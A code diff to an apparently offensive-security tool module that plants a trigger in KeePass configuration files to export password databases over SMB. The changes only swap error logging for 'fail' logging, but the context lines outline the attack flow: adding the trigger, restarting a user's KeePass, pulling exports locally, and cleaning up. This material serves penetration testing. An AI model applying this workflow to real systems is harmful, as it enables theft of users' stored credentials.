@@ -89,12 +89,12 @@ class CMEModule:
 
         if 'ACTION' in module_options:
             if module_options['ACTION'] not in ['ADD', 'CHECK', 'RESTART', 'SINGLE_POLL', 'POLL', 'CLEAN', 'ALL']:
-                context.log.error('Unrecognized action, use --options to list available parameters')
+                context.log.fail('Unrecognized action, use --options to list available parameters')
                 exit(1)
             else:
                 self.action = module_options['ACTION']
         else:
-            context.log.error('Missing ACTION option, use --options to list available parameters')
+            context.log.fail('Missing ACTION option, use --options to list available parameters')
             exit(1)
 
         if 'KEEPASS_CONFIG_PATH' in module_options:
@@ -111,7 +111,7 @@ class CMEModule:
 
         if 'PSH_EXEC_METHOD' in module_options:
             if module_options['PSH_EXEC_METHOD'] not in ['ENCODE', 'PS1']:
-                context.log.error('Unrecognized powershell execution method, use --options to list available parameters')
+                context.log.fail('Unrecognized powershell execution method, use --options to list available parameters')
                 exit(1)
             else:
                 self.powershell_exec_method = module_options['PSH_EXEC_METHOD']
@@ -159,14 +159,14 @@ class CMEModule:
             try:
                 self.put_file_execute_delete(context, connection, self.add_trigger_script_str)
             except Exception as e:
-                context.log.error(f"Error while adding malicious trigger to file: {e}")
+                context.log.fail(f"Error while adding malicious trigger to file: {e}")
                 sys.exit(1)
 
         # checks if the malicious trigger was effectively added to the specified KeePass configuration file
         if self.trigger_added(context, connection):
             context.log.success(f"Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files")
         else:
-            context.log.error(f"Unknown error when adding malicious trigger to file")
+            context.log.fail(f"Unknown error when adding malicious trigger to file")
             sys.exit(1)
 
     def check_trigger_added(self, context, connection):
@@ -194,12 +194,12 @@ class CMEModule:
         for process in keepass_process_list:
             keepass_users.append(process[1])
         if len(keepass_users) == 0:
-            context.log.error('No running KeePass process found, aborting restart')
+            context.log.fail('No running KeePass process found, aborting restart')
             return
         elif len(keepass_users) == 1:  # if there is only 1 KeePass process running
             # if KEEPASS_USER option is specified then we check if the user matches
             if self.keepass_user and (keepass_users[0] != self.keepass_user and keepass_users[0].split('\\')[1] != self.keepass_user):
-                context.log.error(
+                context.log.fail(
                     f"Specified user {self.keepass_user} does not match any KeePass process owner, aborting restart"
                 )
                 return
@@ -212,12 +212,12 @@ class CMEModule:
                     self.keepass_user = keepass_users[0]
                     found_user = True
             if not found_user:
-                context.log.error(
+                context.log.fail(
                     f"Specified user {self.keepass_user} does not match any KeePass process owner, aborting restart"
                 )
                 return
         else:
-            context.log.error('Multiple KeePass processes were found, please specify parameter USER to target one')
+            context.log.fail('Multiple KeePass processes were found, please specify parameter USER to target one')
             return
 
         context.log.display("Restarting {}'s KeePass process".format(keepass_users[0]))
@@ -246,7 +246,7 @@ class CMEModule:
             try:
                 self.put_file_execute_delete(context, connection, self.restart_keepass_script_str)
             except Exception as e:
-                context.log.error('Error while restarting KeePass: {}'.format(e))
+                context.log.fail('Error while restarting KeePass: {}'.format(e))
                 return
 
     def poll(self, context, connection):
@@ -295,7 +295,7 @@ class CMEModule:
                     context.log.success('Moved remote "{}" to local "{}"'.format(export_path, local_full_path))
                     found = True
                 except Exception as e:
-                    context.log.error("Error while polling export files, exiting : {}".format(e))
+                    context.log.fail("Error while polling export files, exiting : {}".format(e))
 
     def clean(self, context, connection):
         """Checks for database export + malicious trigger on the remote host, removes everything"""
@@ -340,12 +340,12 @@ class CMEModule:
                 try:
                     self.put_file_execute_delete(context, connection, self.remove_trigger_script_str)
                 except Exception as e:
-                    context.log.error(f"Error while deleting trigger, exiting: {e}")
+                    context.log.fail(f"Error while deleting trigger, exiting: {e}")
                     sys.exit(1)
 
             # check if the specified KeePass configuration file does not contain the malicious trigger anymore
             if self.trigger_added(context, connection):
-                context.log.error(f"Unknown error while removing trigger '{self.trigger_name}', exiting")
+                context.log.fail(f"Unknown error while removing trigger '{self.trigger_name}', exiting")
             else:
                 context.log.display(f"Found trigger '{self.trigger_name}' in configuration file, removing")
         else:
@@ -370,20 +370,20 @@ class CMEModule:
         """check if the trigger is added to the config file XML tree (returns True/False)"""
         # check if the specified KeePass configuration file exists
         if not self.keepass_config_path:
-            context.log.error("No KeePass configuration file specified, exiting")
+            context.log.fail("No KeePass configuration file specified, exiting")
             sys.exit(1)
 
         try:
             buffer = BytesIO()
             connection.conn.getFile(self.share, self.keepass_config_path.split(":")[1], buffer.write)
         except Exception as e:
-            context.log.error(f"Error while getting file '{self.keepass_config_path}', exiting: {e}")
+            context.log.fail(f"Error while getting file '{self.keepass_config_path}', exiting: {e}")
             sys.exit(1)
 
         try:
             keepass_config_xml_root = ElementTree.fromstring(buffer.getvalue())
         except Exception as e:
-            context.log.error(f"Error while parsing file '{self.keepass_config_path}', exiting: {e}")
+            context.log.fail(f"Error while parsing file '{self.keepass_config_path}', exiting: {e}")
             sys.exit(1)
 
         # check if the specified KeePass configuration file does not already contain the malicious trigger
